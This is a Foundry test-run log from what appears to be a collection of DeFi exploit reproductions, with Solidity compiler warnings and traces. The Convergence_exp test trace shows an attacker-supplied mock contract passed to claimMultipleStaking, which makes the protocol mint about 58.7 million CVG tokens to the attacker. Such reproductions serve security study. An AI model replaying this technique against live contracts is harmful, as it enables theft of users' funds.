Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.10s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2018): Function state mutability can be restricted to view
  --> src/test/2024-08/Convergence_exp.sol:87:5:
   |
87 |     function claimCvgCvxMultiple(address account) external returns (uint256, ICommonStruct.TokenAmount[] memory) {
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 19773)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [19773] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 313.32ms (154.04µs CPU time)

Ran 1 test for src/test/2024-08/Convergence_exp.sol:ContractTest
[PASS] testExploit() (gas: 237597)
Logs:
  [End] Attacker CVG balance after exploit: 58718395.056818121904518498

Traces:
  [237597] ContractTest::testExploit()
    ├─ [131292] → new Mock@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 545 bytes of code
    ├─ [2371] 0x97efFB790f2fbB701D88f89DB4521348A2B77be8::totalSupply() [staticcall]
    │   └─ ← [Return] 44258674397309562755626110 [4.425e25]
    ├─ [57457] 0x2b083beaaC310CC5E190B1d2507038CcB03E7606::claimMultipleStaking([0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1, true, 1)
    │   ├─ [50138] 0x47c69e8c909ce626Af73c955A5e34A20B7c71f19::claimMultipleStaking([0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1, true, 1) [delegatecall]
    │   │   ├─ [1486] Mock::claimCvgCvxMultiple(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ [371] 0x97efFB790f2fbB701D88f89DB4521348A2B77be8::totalSupply() [staticcall]
    │   │   │   │   └─ ← [Return] 44258674397309562755626110 [4.425e25]
    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640519780783186698350374013825 [1.157e77], []
    │   │   ├─ [45714] 0x97efFB790f2fbB701D88f89DB4521348A2B77be8::mintStaking(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640519780783186698350374013825 [1.157e77])
    │   │   │   ├─ [9956] 0xB0Afc8363b8F36E0ccE5D54251e20720FfaeaeE7::isStakingContract(0x2b083beaaC310CC5E190B1d2507038CcB03E7606) [staticcall]
    │   │   │   │   ├─ [2658] 0xbdbdDc4bF67e9Bc02706e4Ce53BC14d6cE3038f1::isStakingContract(0x2b083beaaC310CC5E190B1d2507038CcB03E7606) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 58718395056818121904518498 [5.871e25])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [618] 0x97efFB790f2fbB701D88f89DB4521348A2B77be8::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 58718395056818121904518498 [5.871e25]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker CVG balance after exploit", val: 58718395056818121904518498 [5.871e25], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.68s (1.01s CPU time)

Ran 2 test suites in 2.04s (1.99s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
